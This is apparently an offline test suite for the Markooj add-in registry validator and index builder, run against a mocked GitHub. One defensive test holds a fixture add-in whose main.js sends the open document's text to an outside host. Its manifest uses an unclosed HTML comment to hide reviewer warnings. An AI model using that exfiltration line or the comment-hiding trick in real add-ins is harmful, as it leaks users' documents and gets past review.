#!/usr/bin/env node
// Markooj add-in registry: offline tests for the checks and the index builder (GitHub is mocked).
// Copyright (C) 2026 Ahmed Bilal and contributors. AGPL-3.0-or-later.
//
//   node tools/test.js   (no network needed)
'use strict';
const assert = require('assert');
const crypto = require('crypto');
const path = require('path');
const L = require('./lib');
const V = require('./validate');
const B = require('./build-index');

const tests = [];
const test = (name, fn) => tests.push({ name, fn });
const sha = b => crypto.createHash('sha256').update(b).digest('hex');
const clone = v => JSON.parse(JSON.stringify(v));

// ------------------------------------------------------------ fixtures
const ENTRY = {
  id: 'abbreviations', name: 'Abbreviations', author: 'Markooj', description: 'List the abbreviations defined in a document',
  repo: 'datakeen/markooj-addin-template', category: 'writing', tags: ['abbreviations', 'acronyms', 'glossary'],
};
const OTHER = {
  id: 'word-goals', name: 'Word Goals', author: 'Sara Khan', description: 'Set a word goal for each section and see progress',
  repo: 'sarakhan/word-goals', category: 'productivity', tags: ['goals', 'word-count'],
};
const MAIN = "app.commands.register('x.y', { label: 'X', run() {} });\n";
const manifestFor = (e, extra = {}) => ({ id: e.id, name: e.name, version: '1.0.0', minMarkooj: '1.1.0', author: e.author, description: e.description, category: e.category, ...extra });

/** A pretend GitHub. repos: { 'owner/name': {repo?, tag, assets: {name: Buffer|string|{size}}, readme?, publishedAt?} } */
function mockGitHub(repos) {
  const calls = [];
  const norm = s => decodeURIComponent(s).toLowerCase();
  const find = (o, n) => Object.entries(repos).find(([k]) => k.toLowerCase() === norm(o) + '/' + norm(n));
  const res = (status, body, headers = {}) => {
    const buf = body == null ? Buffer.alloc(0) : Buffer.isBuffer(body) ? body : Buffer.from(typeof body === 'string' ? body : JSON.stringify(body));
    return {
      status, ok: status >= 200 && status < 300,
      headers: { get: k => (k.toLowerCase() === 'content-length' ? String(buf.length) : headers[k.toLowerCase()] ?? null) },
      json: async () => JSON.parse(buf.toString('utf8')),
      arrayBuffer: async () => buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.length),
    };
  };
  const bytes = v => (Buffer.isBuffer(v) ? v : typeof v === 'string' ? Buffer.from(v) : Buffer.alloc(v.size, 97));
  async function fetch(url, init = {}) {
    calls.push({ url, auth: init.headers && init.headers.Authorization, method: init.method || 'GET' });
    let m = url.match(/^https:\/\/api\.github\.com\/repos\/([^/]+)\/([^/]+)(\/releases\/latest)?$/);
    if (m) {
      const hit = find(m[1], m[2]);
      if (!hit) return res(404, { message: 'Not Found' });
      const [key, r] = hit;
      if (!m[3]) return res(200, { full_name: key, private: false, archived: false, license: { spdx_id: 'MIT' }, ...(r.repo || {}) });
      if (!r.tag) return res(404, { message: 'Not Found' });
      return res(200, {
        tag_name: r.tag, html_url: `https://github.com/${key}/releases/tag/${r.tag}`, published_at: r.publishedAt || '2026-11-01T10:00:00Z',
        assets: Object.entries(r.assets).map(([name, v]) => ({ name, size: v && v.listedSize != null ? v.listedSize : bytes(v).length, browser_download_url: 'x' })),
      });
    }
    m = url.match(/^https:\/\/github\.com\/([^/]+)\/([^/]+)\/releases\/download\/([^/]+)\/([^/]+)$/);
    if (m) {
      const hit = find(m[1], m[2]);
      if (!hit || hit[1].tag !== decodeURIComponent(m[3])) return res(404, 'Not Found');
      const v = hit[1].assets[decodeURIComponent(m[4])];
      return v === undefined ? res(404, 'Not Found') : res(200, bytes(v && v.data !== undefined ? v.data : v));
    }
    m = url.match(/^https:\/\/raw\.githubusercontent\.com\/([^/]+)\/([^/]+)\/([^/]+)\/README\.md$/);
    if (m) { const hit = find(m[1], m[2]); return res(hit && hit[1].readme !== false ? 200 : 404, '# Readme'); }
    return res(404, 'Not Found');
  }
  return { fetch, calls };
}

const goodRepo = (e = ENTRY, extra = {}) => ({
  tag: 'v1.0.0',
  assets: { 'manifest.json': JSON.stringify(manifestFor(e)), 'main.js': MAIN, 'styles.css': '.x{color:red}\n' },
  ...extra,
});

// ------------------------------------------------------------ the files in this repository
test('schemas and community-addins.json are valid', () => {
  const s1 = L.loadSchema('community-addins');
  const s2 = L.loadSchema('manifest');
  assert.strictEqual(s1.type, 'array');
  assert.strictEqual(s2.type, 'object');
  assert.deepStrictEqual(s1.items.properties.category.enum, s2.properties.category.enum, 'same categories in both schemas');
  const list = L.readJson(path.join(L.ROOT, 'community-addins.json'));
  assert.deepStrictEqual(L.validateRegistry(list).filter(p => p.level === 'error'), []);
  assert.deepStrictEqual(list[0], ENTRY);
});

test('semver', () => {
  for (const v of ['1.0.0', '0.1.2', '10.20.30', '1.0.0-beta.1', '1.0.0+build.5']) assert.ok(L.isSemver(v), v);
  for (const v of ['1.0', 'v1.0.0', '01.0.0', '1.0.0.0', '', null]) assert.ok(!L.isSemver(v), String(v));
});

// ------------------------------------------------------------ registry checks
const errs = list => L.validateRegistry(list).filter(p => p.level === 'error');
const has = (list, re) => errs(list).some(p => re.test(p.msg));

test('a good list passes; the file must be a list', () => {
  assert.deepStrictEqual(errs([ENTRY, OTHER]), []);
  assert.ok(has({ a: 1 }, /should be a list/));
});

test('duplicate ids and repositories are caught (any case)', () => {
  assert.ok(has([ENTRY, { ...OTHER, id: 'abbreviations' }], /already used by entry 1/));
  assert.ok(has([ENTRY, { ...OTHER, repo: 'DataKeen/Markooj-Addin-Template' }], /already listed in entry 1/));
});

test('id format', () => {
  for (const id of ['ab', 'Abbr', 'a--b', '-abc', 'abc-', 'ab_c', 'a'.repeat(41)]) assert.ok(errs([{ ...OTHER, id }]).length, id);
  for (const id of ['abc', 'word-count', 'x2-y3', 'a'.repeat(40)]) assert.deepStrictEqual(errs([{ ...OTHER, id }]), [], id);
});

test('fields: missing, unknown, category, tags, description length, spaces', () => {
  const { tags, ...noTags } = OTHER;
  assert.ok(has([noTags], /missing "tags"/));
  assert.ok(has([{ ...OTHER, homepage: 'x' }], /"homepage", which is not a known field/));
  assert.ok(has([{ ...OTHER, category: 'games' }], /one of: writing/));
  assert.ok(has([{ ...OTHER, tags: ['Word'] }], /tags\[0\]/));
  assert.ok(has([{ ...OTHER, tags: ['a1', 'a1'] }], /twice/));
  assert.ok(has([{ ...OTHER, description: 'x'.repeat(251) }], /too long \(251 characters; at most 250\)/));
  assert.deepStrictEqual(errs([{ ...OTHER, description: 'x'.repeat(250) }]), []);
  assert.ok(has([{ ...OTHER, description: 'Two\nlines here' }], /not in the right form/));
  assert.ok(has([{ ...OTHER, name: 'Word Goals ' }], /spaces at the start or the end/));
  assert.ok(has([{ ...OTHER, repo: 'not a repo' }], /"repo"/));
});

test('only datakeen may use "Markooj" in id, name or author', () => {
  assert.ok(has([{ ...OTHER, name: 'Markooj Goals' }], /uses the word Markooj/));
  assert.ok(has([{ ...OTHER, author: 'The Markooj team' }], /uses the word Markooj/));
  assert.ok(has([{ ...OTHER, id: 'markooj-goals' }], /uses the word Markooj/));
  assert.deepStrictEqual(errs([{ ...ENTRY, name: 'Markooj Quran' }]), []);
});

test('diff: added, changed, removed', () => {
  const d = L.diffEntries([ENTRY, OTHER], [{ ...ENTRY, tags: ENTRY.tags.slice().reverse() }, { id: 'new-one' }]);
  assert.deepStrictEqual(d.added.map(e => e.id), ['new-one']);
  assert.deepStrictEqual(d.changed.map(e => e.id), ['abbreviations']);
  assert.deepStrictEqual(d.removed, ['word-goals']);
  const same = L.diffEntries([ENTRY], [{ ...clone(ENTRY) }]);
  assert.strictEqual(same.added.length + same.changed.length + same.removed.length, 0, 'key order does not matter');
});

// ------------------------------------------------------------ release checks
const inspect = (repos, entry = ENTRY, extra = {}) => {
  const gh = mockGitHub(repos);
  return L.inspectAddin(entry, { fetch: gh.fetch, token: 'tok', checkReadme: true, ...extra }).then(r => ({ r, gh }));
};

test('a good release passes; the token goes to the API only', async () => {
  const { r, gh } = await inspect({ [ENTRY.repo]: goodRepo() });
  assert.deepStrictEqual(r.errors, []);
  assert.deepStrictEqual(r.warnings, []);
  assert.strictEqual(r.release.tag, 'v1.0.0');
  assert.deepStrictEqual(r.assets.map(a => a.name), ['manifest.json', 'main.js', 'styles.css']);
  for (const c of gh.calls) assert.strictEqual(!!c.auth, c.url.startsWith('https://api.github.com/'), c.url);
});

test('missing repository, release or files', async () => {
  assert.match((await inspect({})).r.errors[0], /was not found/);
  assert.match((await inspect({ [ENTRY.repo]: { assets: {} } })).r.errors[0], /no published release/);
  const noMain = goodRepo(); delete noMain.assets['main.js'];
  assert.match((await inspect({ [ENTRY.repo]: noMain })).r.errors[0], /has no main\.js/);
  const noManifest = goodRepo(); delete noManifest.assets['manifest.json'];
  assert.match((await inspect({ [ENTRY.repo]: noManifest })).r.errors[0], /has no manifest\.json/);
});

test('manifest: invalid JSON, id mismatch, version, minMarkooj, unknown field', async () => {
  const bad = m => goodRepo(ENTRY, { assets: { ...goodRepo().assets, 'manifest.json': typeof m === 'string' ? m : JSON.stringify(m) } });
  assert.match((await inspect({ [ENTRY.repo]: bad('{ nope') })).r.errors[0], /not valid JSON/);
  assert.ok((await inspect({ [ENTRY.repo]: bad(manifestFor({ ...ENTRY, id: 'abbr' })) })).r.errors.some(e => /must be the same/.test(e)));
  assert.ok((await inspect({ [ENTRY.repo]: bad(manifestFor(ENTRY, { version: '1.0' })) })).r.errors.some(e => /should look like 1\.0\.0/.test(e)));
  assert.ok((await inspect({ [ENTRY.repo]: bad(manifestFor(ENTRY, { minMarkooj: 'latest' })) })).r.errors.some(e => /minMarkooj/.test(e)));
  assert.ok((await inspect({ [ENTRY.repo]: bad(manifestFor(ENTRY, { minmarkooj: '1.1.0' })) })).r.errors.some(e => /not a known field/.test(e)));
});

test('sizes: main.js 2 MB, whole add-in 50 MB, listed files', async () => {
  const MB = 1024 * 1024;
  const big = goodRepo(); big.assets['main.js'] = { size: 2 * MB + 1 };
  assert.ok((await inspect({ [ENTRY.repo]: big })).r.errors.some(e => /main\.js is 2\.0 MB; at most 2\.0 MB/.test(e)));
  const files = [{ name: 'a.bin' }, { name: 'b.bin' }];
  const huge = goodRepo(ENTRY, { assets: { ...goodRepo().assets, 'manifest.json': JSON.stringify(manifestFor(ENTRY, { files })), 'a.bin': { listedSize: 30 * MB, data: 'x' }, 'b.bin': { listedSize: 30 * MB, data: 'x' } } });
  assert.ok((await inspect({ [ENTRY.repo]: huge })).r.errors.some(e => /add up to .* at most 50\.0 MB/.test(e)));
  const missing = goodRepo(ENTRY, { assets: { ...goodRepo().assets, 'manifest.json': JSON.stringify(manifestFor(ENTRY, { files: [{ name: 'words.json' }] })) } });
  assert.ok((await inspect({ [ENTRY.repo]: missing })).r.errors.some(e => /lists the file "words\.json"/.test(e)));
  const reserved = goodRepo(ENTRY, { assets: { ...goodRepo().assets, 'manifest.json': JSON.stringify(manifestFor(ENTRY, { files: [{ name: 'main.js' }] })) } });
  assert.ok((await inspect({ [ENTRY.repo]: reserved })).r.errors.length);
  // names Windows cannot save are refused, as Markooj refuses them
  for (const name of ['con.txt', 'data.']) {
    const win = goodRepo(ENTRY, { assets: { ...goodRepo().assets, 'manifest.json': JSON.stringify(manifestFor(ENTRY, { files: [{ name }] })), [name]: 'x' } });
    assert.ok((await inspect({ [ENTRY.repo]: win })).r.errors.some(e => e.includes(`"${name}"`)), name);
  }
  // Markooj installs only from tags without spaces or slashes
  assert.ok((await inspect({ [ENTRY.repo]: goodRepo(ENTRY, { tag: 'release/1.0.0' }) })).r.errors.some(e => /space or a slash/.test(e)));
  const ok =goodRepo(ENTRY, { assets: { ...goodRepo().assets, 'manifest.json': JSON.stringify(manifestFor(ENTRY, { files: [{ name: 'words.json', size: 5 }] })), 'words.json': '["a"]', 'source.zip': 'zip' } });
  const r = (await inspect({ [ENTRY.repo]: ok })).r;
  assert.deepStrictEqual(r.errors, []);
  assert.ok(r.assets.some(a => a.name === 'words.json'));
  assert.ok(r.notes.some(n => /source\.zip/.test(n)), 'unlisted release files are noted, not installed');
});

test('main.js: syntax errors fail; risky calls are pointed out for the reviewer', async () => {
  const broken = goodRepo(); broken.assets['main.js'] = 'app.commands.register(\'x\', {\n';
  assert.ok((await inspect({ [ENTRY.repo]: broken })).r.errors.some(e => /syntax error/.test(e)));
  // `addin` is a parameter in Markooj, as `app` and `markooj` are: declaring it again is an error there too
  const redeclared = goodRepo(); redeclared.assets['main.js'] = 'const addin = 1;\n';
  assert.ok((await inspect({ [ENTRY.repo]: redeclared })).r.errors.some(e => /syntax error/.test(e)));
  const topLevelReturn = goodRepo(); topLevelReturn.assets['main.js'] = 'if (!app) return;\nconst a = 1;\n';
  assert.deepStrictEqual((await inspect({ [ENTRY.repo]: topLevelReturn })).r.errors, [], 'main.js is a function body, so return is fine');
  const risky = goodRepo(); risky.assets['main.js'] = 'const a = 1;\nfetch("https://example.org");\neval("2");\nconst r = require("fs");\n' + 'x'.repeat(600) + '\n';
  const { review } = (await inspect({ [ENTRY.repo]: risky })).r;
  assert.ok(review.some(m => /network \(line 2\)/.test(m)), review.join('\n'));
  assert.ok(review.some(m => /eval\(\) \(line 3\)/.test(m)));
  assert.ok(review.some(m => /Node\.js modules or code \(line 4\)/.test(m)));
  assert.ok(review.some(m => /longer than 500/.test(m)));
  assert.deepStrictEqual(L.reviewHints(MAIN), []);
});

test('warnings: tag and version, no README, no license, renamed; errors: moved to another owner, private', async () => {
  let r = (await inspect({ [ENTRY.repo]: goodRepo(ENTRY, { tag: 'release-1', readme: false, repo: { license: null } }) })).r;
  assert.deepStrictEqual(r.errors, []);
  assert.ok(r.warnings.some(w => /tag is release-1/.test(w)));
  assert.ok(r.warnings.some(w => /No README\.md/.test(w)));
  assert.ok(r.warnings.some(w => /No license file/.test(w)));
  r = (await inspect({ [ENTRY.repo]: goodRepo(ENTRY, { repo: { full_name: 'datakeen/abbreviations' } }) })).r;
  assert.ok(r.warnings.some(w => /renamed to datakeen\/abbreviations/.test(w)));
  r = (await inspect({ [ENTRY.repo]: goodRepo(ENTRY, { repo: { full_name: 'someone/markooj-addin-template' } }) })).r;
  assert.ok(r.errors.some(e => /now belongs to someone/.test(e)));
  r = (await inspect({ [ENTRY.repo]: goodRepo(ENTRY, { repo: { private: true } }) })).r;
  assert.ok(r.errors.some(e => /private/.test(e)));
});

test('rate limit gives a plain message', async () => {
  const f = async () => ({ status: 403, ok: false, headers: { get: k => (k === 'x-ratelimit-remaining' ? '0' : null) } });
  const r = await L.inspectAddin(ENTRY, { fetch: f, token: '' });
  assert.match(r.errors[0], /rate limit.*GITHUB_TOKEN/);
});

// ------------------------------------------------------------ index.json
const INDEX_KEYS = ['id', 'name', 'author', 'description', 'repo', 'category', 'tags', 'verified', 'version', 'minMarkooj', 'tag', 'assets', 'readmeUrl', 'homepage', 'updatedAt'];

test('index.json: shape, URLs, sizes, sha256, verified, order', async () => {
  const repos = { [ENTRY.repo]: goodRepo(), [OTHER.repo]: goodRepo(OTHER, { tag: '2.1.0', assets: { 'manifest.json': JSON.stringify(manifestFor(OTHER, { version: '2.1.0', icon: 'check', color: '#30b0c7' })), 'main.js': MAIN } }) };
  const gh = mockGitHub(repos);
  const { index, problems, kept } = await L.buildIndex([OTHER, ENTRY], { fetch: gh.fetch, token: '', now: new Date('2026-11-22T00:00:00Z') });
  assert.deepStrictEqual(problems, []);
  assert.deepStrictEqual(kept, []);
  assert.deepStrictEqual(Object.keys(index), ['format', 'updated', 'addins']);
  assert.strictEqual(index.format, 1);
  assert.strictEqual(index.updated, '2026-11-22T00:00:00.000Z');
  assert.deepStrictEqual(index.addins.map(a => a.id), ['abbreviations', 'word-goals'], 'sorted by id');
  const [a, b] = index.addins;
  assert.deepStrictEqual(Object.keys(a), INDEX_KEYS);
  assert.deepStrictEqual(Object.keys(b), [...INDEX_KEYS, 'icon', 'color']);
  assert.strictEqual(a.verified, true);
  assert.strictEqual(b.verified, false);
  assert.strictEqual(a.version, '1.0.0');
  assert.strictEqual(a.minMarkooj, '1.1.0');
  assert.strictEqual(a.tag, 'v1.0.0');
  assert.strictEqual(a.readmeUrl, 'https://raw.githubusercontent.com/datakeen/markooj-addin-template/v1.0.0/README.md');
  assert.strictEqual(a.homepage, 'https://github.com/datakeen/markooj-addin-template');
  assert.strictEqual(a.updatedAt, '2026-11-01T10:00:00Z');
  assert.deepStrictEqual(a.assets.map(x => x.name), ['manifest.json', 'main.js', 'styles.css']);
  const main = a.assets[1];
  assert.strictEqual(main.url, 'https://github.com/datakeen/markooj-addin-template/releases/download/v1.0.0/main.js');
  assert.strictEqual(main.size, Buffer.byteLength(MAIN));
  assert.strictEqual(main.sha256, sha(Buffer.from(MAIN)));
  for (const x of a.assets) assert.match(x.sha256, /^[0-9a-f]{64}$/);
  assert.deepStrictEqual(Object.keys(main), ['name', 'url', 'size', 'sha256']);
});

test('index.json: problems are left out, or kept at the last good version', async () => {
  const broken = goodRepo(); delete broken.assets['main.js'];
  const gh = mockGitHub({ [ENTRY.repo]: broken, [OTHER.repo]: goodRepo(OTHER) });
  let res = await L.buildIndex([ENTRY, OTHER], { fetch: gh.fetch, token: '' });
  assert.deepStrictEqual(res.index.addins.map(a => a.id), ['word-goals']);
  assert.strictEqual(res.problems.length, 1);
  assert.strictEqual(res.problems[0].id, 'abbreviations');
  const previous = { format: 1, updated: 'x', addins: [{ id: 'abbreviations', repo: 'datakeen/markooj-addin-template', name: 'Old', version: '0.9.0', verified: true, assets: [] }] };
  res = await L.buildIndex([{ ...ENTRY, description: 'A newer description of the add-in' }, OTHER], { fetch: gh.fetch, token: '', previous });
  assert.deepStrictEqual(res.kept, ['abbreviations']);
  const k = res.index.addins.find(a => a.id === 'abbreviations');
  assert.strictEqual(k.version, '0.9.0');
  assert.strictEqual(k.name, 'Abbreviations', 'registry fields come from the current list');
  assert.strictEqual(k.description, 'A newer description of the add-in');
  // an entry that fails the registry checks is never built, and nothing is downloaded for it
  const gh2 = mockGitHub({ [OTHER.repo]: goodRepo(OTHER) });
  res = await L.buildIndex([OTHER, { ...OTHER, repo: 'x/y' }], { fetch: gh2.fetch, token: '' });
  assert.deepStrictEqual(res.index.addins.map(a => a.id), ['word-goals']);
  assert.match(res.problems[0].errors[0], /already used/);
  assert.ok(!gh2.calls.some(c => c.url.includes('/x/y')));
  assert.match(B.report(res, 2), /1 of 2 add-ins/);
});

// ------------------------------------------------------------ validate.js
test('validate: with a base list only new and changed entries are checked online', async () => {
  const gh = mockGitHub({ [ENTRY.repo]: goodRepo(), [OTHER.repo]: goodRepo(OTHER) });
  const res = await V.run({ list: [ENTRY, OTHER], base: [ENTRY], remote: true, fetch: gh.fetch, token: '' });
  assert.ok(res.ok, res.text);
  assert.ok(!gh.calls.some(c => c.url.includes('markooj-addin-template')), 'unchanged entry not fetched');
  assert.ok(gh.calls.some(c => c.url.includes('sarakhan/word-goals')));
  assert.match(res.markdown, /^<!-- markooj-addins-check -->/);
  assert.match(res.markdown, /Result: passed/);
  assert.match(res.markdown, /Looks good: word-goals \(sarakhan\/word-goals\), new/);
});

test('validate: problems fail and read well', async () => {
  const gh = mockGitHub({ [OTHER.repo]: goodRepo(OTHER, { assets: { 'manifest.json': JSON.stringify(manifestFor({ ...OTHER, id: 'goals' })), 'main.js': MAIN } }) });
  const res = await V.run({ list: [ENTRY, OTHER, { ...OTHER, id: 'x', repo: 'a/b', name: 'Markooj X' }], base: [ENTRY], remote: true, fetch: gh.fetch, token: '' });
  assert.ok(!res.ok);
  assert.match(res.markdown, /Needs changes: word-goals/);
  assert.match(res.markdown, /must be the same/);
  assert.match(res.markdown, /uses the word Markooj/);
  assert.match(res.markdown, /adds or changes 2 entries/);
  const offline = await V.run({ list: [ENTRY], base: null, remote: false });
  assert.ok(offline.ok);
  assert.match(offline.text, /1 entry/);
});

test('validate: the submitter\'s text cannot hide the reviewer hints or change the comment', async () => {
  // an unclosed HTML comment in the manifest once hid everything after it on GitHub, including "uses the network"
  const sneaky = manifestFor(OTHER, { permissions: 'Edits only the open document <!-- ' });
  const gh = mockGitHub({ [OTHER.repo]: goodRepo(OTHER, { assets: { 'manifest.json': JSON.stringify(sneaky), 'main.js': "fetch('https://example.com/?d=' + app.docs.active().text);\n" } }) });
  const res = await V.run({ list: [ENTRY, OTHER], base: [ENTRY], remote: true, fetch: gh.fetch, token: '' });
  assert.ok(!/(^|[^\\])<!-- (?!markooj-addins-check)/.test(res.markdown), 'no raw HTML comment from the submitter');
  assert.match(res.markdown, /uses the network/);
  assert.match(res.text, /open document <!-- /, 'the plain text output keeps the text as it is');
  assert.strictEqual(L.mdText('@someone [x](https://e.example) *b*\nnext'), '@​someone \\[x\\](https://e.example) \\*b\\* next');
  // main.js is parsed as a function body on its own, like new Function(...) in Markooj
  assert.ok(L.syntaxError('});\nglobalThis.x = 1;\n(function () {'), 'closing the wrapper early is a syntax error');
  assert.strictEqual(L.syntaxError('return 1;'), null);
  // an add-in that comes with Markooj keeps its id
  assert.ok(L.validateRegistry([{ ...OTHER, id: 'readability' }]).some(p => p.level === 'error' && /comes with Markooj/.test(p.msg)));
  assert.ok(!L.validateRegistry([{ ...ENTRY, id: 'readability' }]).some(p => /comes with Markooj/.test(p.msg)), 'the Markooj team may');
});

test('validate: command line options', () => {
  const a = V.parseArgs(['new.json', '--remote', '--base', 'old.json', '--report', 'r.md']);
  assert.deepStrictEqual([a.file, a.remote, a.base, a.report], ['new.json', true, 'old.json', 'r.md']);
  assert.throws(() => V.parseArgs(['--nope']));
});

// ------------------------------------------------------------ run
(async () => {
  let failed = 0;
  for (const t of tests) {
    try { await t.fn(); console.log(`ok   ${t.name}`); } catch (e) { failed++; console.log(`FAIL ${t.name}\n     ${e && e.stack ? e.stack.split('\n').slice(0, 3).join('\n     ') : e}`); }
  }
  console.log(`\n${tests.length - failed}/${tests.length} passed`);
  process.exitCode = failed ? 1 : 0;
})();
